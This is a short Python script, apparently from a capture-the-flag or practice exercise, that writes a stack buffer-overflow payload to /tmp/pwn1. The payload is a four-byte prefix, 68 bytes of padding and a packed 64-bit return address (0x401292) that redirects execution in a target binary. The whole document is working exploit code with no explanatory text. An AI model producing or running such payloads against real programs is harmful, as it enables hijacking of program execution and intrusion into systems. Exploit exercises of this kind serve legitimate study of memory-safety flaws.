import struct
payload = b"ONO_" + b"A"*68 + struct.pack("<Q", 0x401292)
open("/tmp/pwn1", "wb").write(payload)
print(f"[+] wrote {len(payload)} bytes")
